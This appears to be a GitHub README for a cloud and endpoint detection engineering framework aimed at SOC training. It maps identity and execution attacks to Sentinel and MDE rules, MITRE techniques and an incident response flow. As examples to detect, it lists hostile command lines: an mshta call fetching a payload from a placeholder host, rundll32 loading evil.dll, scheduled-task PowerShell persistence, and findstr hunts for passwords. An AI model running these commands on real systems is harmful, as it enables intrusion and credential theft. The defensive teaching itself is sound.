# Cloud + Endpoint Detection Engineering Framework  
### Hybrid Attack Chains • MITRE ATT&CK • Incident Response • SOC Training Material  

<p align="center">
  <img src="https://static.vecteezy.com/system/resources/previews/043/410/734/non_2x/concept-of-private-key-or-cyber-security-graphic-of-electronic-pattern-texured-key-with-futuristic-element-vector.jpg" width="650">
</p>

---

## Purpose of This Repository

This repository provides a unified **Cloud + Endpoint Detection Engineering Framework**, designed to:

- Deliver **production-grade KQL rules** for Microsoft Sentinel (Cloud) and MDE (Endpoint).  
- Train **L2 → L3 SOC analysts** in detection logic, kill-chain modelling, and decision-making.  
- Demonstrate **senior-level detection engineering capability**, including:  
  - identity attack detection,  
  - execution/persistence detection,  
  - kill-chain correlation,  
  - low-noise, high-fidelity filtering.  
- Support incident responders dealing with **identity-led intrusions**, ransomware, and cloud abuse.

This README contains:

- Cloud vs Endpoint detection principles  
- Mermaid attack-chain diagrams  
- MITRE ATT&CK coverage mapping  
- Incident response SOP  
- Detection rule categories  
- Rule deployment strategy  
- Repository structure  

All diagrams **render automatically in GitHub**.

---

# Cloud vs Endpoint Detection (SOC Training Section)

## Sentinel Cloud Rules – What They Solve

Cloud rules answer questions such as:

- Who authenticated?  
- From where and when?  
- Did an attacker modify:  
  - App secrets  
  - Certificates  
  - Service Principals  
  - OAuth consents  
  - Roles   
- Did a new IP/geo appear for a user?  
- Did an SPN suddenly begin authenticating?  

Cloud rules operate on **control-plane and identity-plane logs**:

- `AuditLogs`  
- `SigninLogs`  
- `AADServicePrincipalSignInLogs`  
- `IdentityLogonEvents`  
- VPN sign-in telemetry  

Cloud rules **cannot detect execution, DLL loading, persistence, RMM tools, or malware behaviour**.

### When to write a Sentinel cloud rule?

> **When your question is about identity, authentication, permissions, tokens, or cloud resource usage.**

Examples:

- App Secret Added → Immediate SPN Login (Golden SAML style compromise)  
- SPN First-Time Login  
- SPN Impossible Travel  
- VPN Login from First-Time IP  
- OAuth App sudden privilege usage  

---

##  MDE Endpoint Rules – What They Solve

Endpoint rules detect:

- Execution  
- LOLBIN abuse  
- DLL sideloading  
- Persistence mechanisms (tasks, services, scripts)  
- RMM tool execution  
- Credential discovery  
- Downloaders (certutil, curl, msbuild, powershell loaders)

Endpoint rules use:

- `DeviceProcessEvents`  
- `DeviceFileEvents`  
- `DeviceRegistryEvents`  
- `DeviceNetworkEvents`

Endpoint rules **cannot see** cloud-based attacks.

### When to write an MDE endpoint rule?

> **When the question is about code execution, persistence, lateral movement, or filesystem activity.**

Examples:

- `mshta http://malicious/payload.hta`  
- `rundll32 C:\Users\Public\evil.dll,#1`  
- AnyDesk launched after VPN login  
- Scheduled task executing PowerShell from `%TEMP%`  
- findstr / Select-String for "password" or "unattend.xml"  

---

# Cloud + Endpoint Architecture

```mermaid
flowchart LR
    A[Cloud Identity Logs<br/>SigninLogs / AuditLogs / SPN Logs] -->|Authentication Behaviour| B[Sentinel Cloud Rules]
    C[Endpoint Telemetry<br/>DeviceProcessEvents / FileEvents] -->|Execution Behaviour| D[MDE Endpoint Rules]
    B --> E[Correlation & Hunting<br/>Cloud ↔ Endpoint]
    D --> E
    E --> F[Kill Chain Reconstruction<br/>Initial Access → Execution → Persistence → Escalation]
sequenceDiagram
    participant Attacker
    participant VPN
    participant Cloud
    participant Endpoint
    participant RMM
    participant SPN

    Attacker->>VPN: First-time VPN login from NEW IP/Geo
    VPN->>Cloud: Sign-in logged in Sentinel
    Cloud-->>SOC: Cloud rule triggers (New IP)

    Attacker->>Endpoint: Deploy RMM (AnyDesk/RustDesk/ScreenConnect)
    Endpoint->>RMM: Execution telemetry
    Endpoint-->>SOC: MDE Rule triggers (RMM execution)

    Attacker->>Cloud: Add App Secret to SPN
    Cloud->>SPN: SPN logs in using stolen secret
    Cloud-->>SOC: Cloud App Hijack Rule triggers (Secret Added → SPN Login)

    Attacker->>CorpNetwork: Privilege Escalation + Lateral Movement
```

```graph TD
    A1[Initial Access<br/>T1078 Valid Accounts]:::init
    A2[T1133 External Remote Services]:::init

    B1[Execution<br/>T1218 Signed Binary Proxy Execution]:::exec
    B2[T1059 Script Execution]:::exec

    C1[Persistence<br/>T1053 Scheduled Tasks]:::pers
    C2[T1219 Remote Access Software]:::pers

    D1[Privilege Escalation<br/>T1098 Account Manipulation]:::priv
    D2[T1550 Token Impersonation/Replay]:::priv

    E1[Credential Access<br/>T1081 Password Files]:::cred
    E2[T1552 Credentials in Files]:::cred

    F1[Defense Evasion<br/>T1218 LOLBIN Abuse]:::ev
    F2[T1140 Deobfuscation]:::ev

    classDef init fill:#ffb3b3,stroke:#333;
    classDef exec fill:#b3ffb3,stroke:#333;
    classDef pers fill:#ffd699,stroke:#333;
    classDef priv fill:#b3d1ff,stroke:#333;
    classDef cred fill:#fff5b3,stroke:#333;
    classDef ev fill:#e0e0e0,stroke:#333;
```
Cloud Detection Rules — Sentinel

| Rule Name                        | Purpose                                   | Detects                       | MITRE               |
| -------------------------------- | ----------------------------------------- | ----------------------------- | ------------------- |
| **Cloud_App_Hijack_Ultimate_V5** | Detects App Secret Added → SPN Login      | Golden SAML-style hijack      | T1098, T1550, T1078 |
| **SPN_Impossible_Travel_V5**     | SPN login from two geos within 60 minutes | Stolen tokens, Cloud pivoting | T1078               |
| **SPN_First_Login_V5**           | SPN authenticating for first time ever    | Compromised app creds         | T1078               |
| **SPN_Privilege_Abuse_V5**       | SPN accessing Graph/Directory/KeyVault    | Privilege escalation          | T1550               |
| **VPN_RMM_KillChain_V5**         | First-time VPN login → RMM execution      | Akira/Black Basta TTP         | T1133, T1219        |


# Endpoint Detection Rules — MDE

| Rule Name                              | Purpose                                | Detects                     | MITRE     |
| -------------------------------------- | -------------------------------------- | --------------------------- | --------- |
| **Universal_LOLBIN_Execution_Hunt_V4** | Detects mshta/regsvr32/rundll32 misuse | AWL bypass, proxy execution | T1218     |
| **Sensitive_Data_Recon_Hunt_V4**       | Detects findstr/grep for credentials   | Password hunting            | T1081     |
| **Polymorphic_Persistence_Hunt_V4**    | Detects Scheduled Task persistence     | LOLBIN persistence          | T1053.005 |
| **Compiler_Downloader_LOLBIN_Hunt**    | certutil/curl/wget/msbuild downloaders | Malware staging             | T1105     |
| **RMM_Execution_Hunt**                 | AnyDesk/RustDesk/ScreenConnect         | Remote access tools         | T1219     |

flowchart TD
    Q1{Did something EXECUTE<br/>on a host?}
    Q1 -->|Yes| MDE[MDE Endpoint Rule<br/>Execution / Persistence / Lateral Movement]
    Q1 -->|No| Q2{Is this identity,<br/>authentication, or token behaviour?}

    Q2 -->|Yes| CLOUD[Sentinel Cloud Rule<br/>SigninLogs / AuditLogs / SPN Logs]
    Q2 -->|No| Q3{Is this cloud privilege<br/>or configuration manipulation?}

    Q3 -->|Yes| CONF[Sentinel Cloud Rule<br/>App Secrets / SPN / OAuth / Roles]
    Q3 -->|No| OTHER[Use another telemetry source<br/>Firewall, proxy, CASB, custom logs]
```
# QUICK GUIDE
```
| Scenario                     | Example                               | Correct Rule Type | Why                          |
| ---------------------------- | ------------------------------------- | ----------------- | ---------------------------- |
| First-time VPN login         | User logs in from Brazil at 3AM       | Cloud             | Authentication-based anomaly |
| RMM executed                 | `anydesk.exe` on host                 | MDE               | Execution telemetry          |
| App Secret Added             | Secret added to App Registration      | Cloud             | Control-plane change         |
| Task persistence             | `schtasks /create /tr powershell.exe` | MDE               | Local persistence            |
| SPN using Graph APIs         | SPN suddenly talks to KeyVault        | Cloud             | Token/privilege misuse       |
| rundll32 loads DLL from TEMP | `evil.dll,#1`                         | MDE               | Execution attack             |

# Incident Response SOP (NIST 800-61)
```flowchart TD
    A[Detection & Analysis] --> B[Containment]
    B --> C[Eradication]
    C --> D[Recovery]
    D --> E[Lessons Learned]

    A --> A1[Cloud Log Review<br/>SigninLogs, AuditLogs, SPN Logs]
    A --> A2[Endpoint Timeline<br/>DeviceProcessEvents, FileEvents]

    B --> B1[Isolate Endpoints<br/>MDE Live Response]
    B --> B2[Disable Accounts<br/>Revoke Tokens, Reset Secrets]

    C --> C1[Remove Persistence<br/>Tasks, RMM Tools, LOLBIN Scripts]
    C --> C2[Reset Cloud Secrets<br/>Remove Unauthorized Credentials]

    D --> D1[Restore Services<br/>Re-enforce MFA, CAE]
    D --> D2[Re-Onboard Devices]

    E --> E1[Document Kill Chain]
    E --> E2[Improve Detections]












